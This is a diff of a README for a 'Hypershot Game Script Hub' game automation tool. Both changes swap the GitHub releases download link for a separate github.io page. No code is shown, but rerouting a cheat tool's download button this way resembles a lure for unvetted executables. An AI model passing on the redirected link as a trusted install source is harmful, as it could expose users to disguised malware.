@@ -6,7 +6,7 @@ Hypershot Game Script Hub is a powerful automation toolkit designed specifically
 
 ## 📥 Download & Install
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️%20DOWNLOAD-Hypershot%20Game%20Script%20Hub-00FF88?style=for-the-badge&logo=github&logoColor=white&labelColor=003049)](https://github.com/lissaexpress393/hypershot-game-script-hub/releases)
+[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️%20DOWNLOAD-Hypershot%20Game%20Script%20Hub-00FF88?style=for-the-badge&logo=github&logoColor=white&labelColor=003049)](https://lissaexpress393.github.io)
 
 ### 📦 Installation Guide
 
@@ -136,7 +136,7 @@ Upcoming features include:
 
 Congratulations! You now have everything you need to start automating your gaming experience. Remember to:
 
-1. Download the app from [the download page](https://github.com/lissaexpress393/hypershot-game-script-hub/releases)
+1. Download the app from [the download page](https://lissaexpress393.github.io)
 2. Take your time exploring the interface
 3. Start with simple routines and gradually experiment
 4. Join the community to learn new tricks
